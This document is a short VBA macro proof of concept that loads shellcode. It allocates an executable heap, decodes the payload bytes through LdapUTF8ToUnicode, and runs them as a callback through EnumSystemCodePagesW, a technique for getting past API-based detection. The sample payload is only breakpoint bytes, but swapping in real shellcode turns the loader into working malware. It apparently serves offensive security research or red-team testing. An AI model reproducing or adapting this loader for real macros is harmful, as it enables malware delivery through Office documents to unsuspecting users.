Private Declare PtrSafe Function HeapCreate Lib "KERNEL32" (ByVal flOptions As Long, ByVal dwInitialSize As LongPtr, ByVal dwMaximumSize As LongPtr) As LongPtr
Private Declare PtrSafe Function HeapAlloc Lib "KERNEL32" (ByVal hHeap As LongPtr, ByVal dwFlags As Long, ByVal dwBytes As LongPtr) As LongPtr
Private Declare PtrSafe Function EnumSystemCodePagesW Lib "KERNEL32" (ByVal lpCodePageEnumProc As LongPtr, ByVal dwFlags As Long) As Long
Private Declare PtrSafe Function LdapUTF8ToUnicode Lib "WLDAP32" (ByVal lpSrcStr As LongPtr, ByVal cchSrc As Long, ByVal lpDestStr As LongPtr, ByVal cchDest As Long) As Long


Sub poc()
    Dim orig_shellcode(0 To 5) As Byte
    Dim copied_shellcode As LongPtr
    Dim heap As LongPtr
    Dim size As Long
    Dim ret As Long
    Dim HEAP_CREATE_ENABLE_EXECUTE As Long
    
    HEAP_CREATE_ENABLE_EXECUTE = &H40000
    
    '\xec\xb3\x8c\xec\xb3\x8c ==> \xcc\xcc\xcc\xcc
    orig_shellcode(0) = &HEC
    orig_shellcode(1) = &HB3
    orig_shellcode(2) = &H8C
    orig_shellcode(3) = &HEC
    orig_shellcode(4) = &HB3
    orig_shellcode(5) = &H8C
    
    heap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0)
    copied_shellcode = HeapAlloc(heap, 0, &H10)
    size = LdapUTF8ToUnicode(VarPtr(orig_shellcode(0)), 6, 0, 0)
    ret = LdapUTF8ToUnicode(VarPtr(orig_shellcode(0)), 6, copied_shellcode, size)
    ret = EnumSystemCodePagesW(copied_shellcode, 0)
End Sub
